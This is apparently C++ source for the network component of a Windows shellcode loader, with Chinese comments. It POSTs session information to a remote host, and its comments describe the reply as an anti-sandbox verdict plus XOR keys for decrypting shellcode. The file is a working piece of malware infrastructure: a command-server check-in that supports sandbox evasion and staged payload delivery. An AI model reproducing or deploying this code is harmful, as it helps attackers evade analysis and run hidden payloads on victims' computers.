#include <iostream>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

// 构造请求包
void ConstructRequestPackage(char** pRequestPackage, int* pRequestPackageLength, char* requestHeader, char* sessionInfo, int sessionInfoLength) {
	char requestContentLength[10] = "";
	sprintf_s(requestContentLength, sizeof(requestContentLength), "%d", sessionInfoLength);

	*pRequestPackageLength = strlen(requestHeader) + strlen(requestContentLength) + 4 + sessionInfoLength;
	*pRequestPackage = (char*)malloc(*pRequestPackageLength);

	sprintf_s(*pRequestPackage, *pRequestPackageLength, "%s%s\r\n\r\n", requestHeader, requestContentLength);
	memcpy(*pRequestPackage + *pRequestPackageLength - sessionInfoLength, sessionInfo, sessionInfoLength);
}

// 接收命令
void ReceiveCommand(SOCKET clientSocket, PBYTE pAntiSandboxResult, PBYTE pReceiveXor1, PBYTE pReceiveXor2) {
	char* responsePackage = (char*)malloc(300);
	if (recv(clientSocket, responsePackage, 300, 0) == SOCKET_ERROR) {
		return;
	}
	// 命令结构: 判定结果 + ShellCode密钥
	char* responseBody = strstr(responsePackage, "\r\n\r\n") + 4;
	*pAntiSandboxResult = *responseBody;
	*pReceiveXor1 = *(responseBody + 1);
	*pReceiveXor2 = *(responseBody + 2);
	free(responsePackage);
}

// HTTP 请求
void HttpRequest(char* host, int port, char* requestHeader, char* sessionInfo, int sessionInfoLength, PBYTE pAntiSandboxResult, PBYTE pReceiveXor1, PBYTE pReceiveXor2) {
	// 构造请求包
	char* requestPackage;
	int requestPackageLength;
	ConstructRequestPackage(&requestPackage, &requestPackageLength, requestHeader, sessionInfo, sessionInfoLength);

	// 初始化库
	WSADATA lpWSAData;
	if (WSAStartup(MAKEWORD(2, 2), &lpWSAData)) {
		return;
	}
	// 创建 IPv4 + TCP 套接字
	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (clientSocket == INVALID_SOCKET) {
		WSACleanup();
		return;
	}
	// 通过套接字建立连接
	sockaddr_in sockaddress;
	sockaddress.sin_family = AF_INET;
	sockaddress.sin_port = htons(port);
	if (!inet_pton(AF_INET, host, &(sockaddress.sin_addr))) {
		closesocket(clientSocket);
		WSACleanup();
		return;
	}
	if (connect(clientSocket, (sockaddr*)&sockaddress, sizeof(sockaddress))) {
		closesocket(clientSocket);
		WSACleanup();
		return;
	}

	// POST 请求
	if (send(clientSocket, requestPackage, requestPackageLength, 0) == SOCKET_ERROR) {
		closesocket(clientSocket);
		WSACleanup();
		return;
	}
	free(requestPackage);
	ReceiveCommand(clientSocket, pAntiSandboxResult, pReceiveXor1, pReceiveXor2);

	closesocket(clientSocket);
	WSACleanup();
}